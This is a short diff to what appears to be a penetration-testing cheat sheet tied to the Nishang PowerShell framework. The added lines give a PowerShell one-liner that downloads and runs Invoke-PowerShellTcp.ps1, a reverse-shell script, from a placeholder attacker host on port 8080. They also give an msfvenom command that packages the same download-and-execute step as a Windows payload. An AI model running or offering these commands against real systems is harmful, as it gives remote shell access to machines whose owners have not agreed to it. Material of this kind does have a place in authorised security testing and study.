@@ -7,6 +7,10 @@ https://github.com/samratashok/nishang
 # IEX(New-Object Net.WebClient).downloadString('http://ip:8080/Invoke-PowerShellTcp.ps1')
 ###################################################################################################################################
 
+Eg : powershell IEX(New-Object Net.WebClient).downloadString('http://ip:8080/Invoke-PowerShellTcp.ps1')
+Eg : For msfvenom 
+msfvenom -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://ip:8080/Invoke-PowerShellTcp.ps1')\""
+
 Note : Location of 64 bit libraries are C:\Windows\SysNative\ and powershell location is : C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe 
 
 
